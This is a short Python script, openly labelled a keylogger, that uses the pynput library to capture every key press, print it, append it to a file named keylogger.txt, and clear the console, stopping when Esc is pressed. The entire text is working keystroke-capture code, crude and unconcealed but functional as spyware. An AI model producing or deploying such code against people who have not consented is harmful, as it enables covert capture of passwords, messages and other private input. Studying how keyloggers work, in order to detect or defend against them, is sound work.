from pynput.keyboard import Key, Listener
import os
import time

# keep tracking while press on keyboard

def on_press(key):
    keyData = str(key)
    print(keyData)
    with open('keylogger.txt', 'a') as data:
        data.write(keyData)

    # after every press key , wait 0.3 seconds

    time.sleep(0.3)

    # show pressed charachter , check OS , and then clear console

    def clear():
        os.system('cls' if os.name=='nt' else 'clear')
    clear()

# break on_press function

def on_release(key):

    if key == Key.esc:
        return False

with Listener(on_press = on_press, on_release = on_release) as l:
    l.join()
